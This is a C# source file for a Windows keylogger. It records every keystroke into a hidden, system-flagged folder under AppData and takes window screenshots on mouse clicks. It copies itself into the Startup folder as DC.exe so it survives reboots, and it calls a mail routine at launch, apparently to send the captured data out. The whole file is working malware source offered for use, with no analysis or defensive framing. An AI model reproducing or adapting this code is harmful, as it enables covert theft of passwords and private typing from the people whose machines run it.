using System;
using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        private static Mail mail = new Mail();
        private static SnapShot snapShot = new SnapShot();

        static void LogKeys()
        {
            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            filepath = filepath + @"\TKH\";

            if (!Directory.Exists(filepath))
            {
                DirectoryInfo loggerFolder = Directory.CreateDirectory(filepath);
                loggerFolder.Attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory;
            }

            else
            {
                DirectoryInfo loggedFolder = new FileInfo(filepath).Directory;
                if ((loggedFolder.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
                    loggedFolder.Attributes |= FileAttributes.Hidden;

                if ((loggedFolder.Attributes & FileAttributes.System) != FileAttributes.System)
                    loggedFolder.Attributes |= FileAttributes.System;

                if ((loggedFolder.Attributes & FileAttributes.Directory) != FileAttributes.Directory)
                    loggedFolder.Attributes |= FileAttributes.Directory;
            }

            string path = (@filepath + "DC.text");
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                }
                //end
            }

            KeysConverter converter = new KeysConverter();
            string text = string.Empty;
            bool capsLockStatus = Control.IsKeyLocked(Keys.CapsLock);
            using (StreamWriter sw = File.AppendText(path))
            {
                sw.WriteLine("CapsLock=" + ((capsLockStatus == true) ? "on" : "off"));
            }
            while (true)
            {
                for (int i = 0; i < 1000; i++)
                {
                    int key = GetAsyncKeyState(i);
                    if (GetAsyncKeyState((int)Keys.LButton) < 0)
                    {
                        snapShot.TakeWindowSnap();
                    }

                    if (GetAsyncKeyState((int)Keys.CapsLock) < 0)
                    {
                        capsLockStatus = Control.IsKeyLocked(Keys.CapsLock);
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine("CapsLock=" + ((capsLockStatus == true) ? "on" : "off"));
                        }
                    }

                    if (GetAsyncKeyState((int)Keys.Enter) < 0)
                    {
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine();
                            sw.Write("ENTER");
                        }
                    }

                    else if (GetAsyncKeyState((int)Keys.Space) < 0)
                    {
                        // SPACEBAR IS KUT bug hier
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write("'");
                        }

                        break;
                    }

                    else if (key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            if(capsLockStatus)
                                sw.Write(text);
                            else
                                sw.Write(text.ToLower());
                        }

                        break;
                    }
                }
            }
        }
       
        static void SetStartUp()
        {
            if(!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + "DC.exe"))
                File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + "DC.exe");
        }


        static void Main(string[] args)
        {
            // Set the program in the startup files
            SetStartUp();
            Random rand = new Random();

            //int randomNumber = rand.Next(1, 10);
            //if (randomNumber < 11) 
            mail.SendMail();

            LogKeys();
        }
    }
}
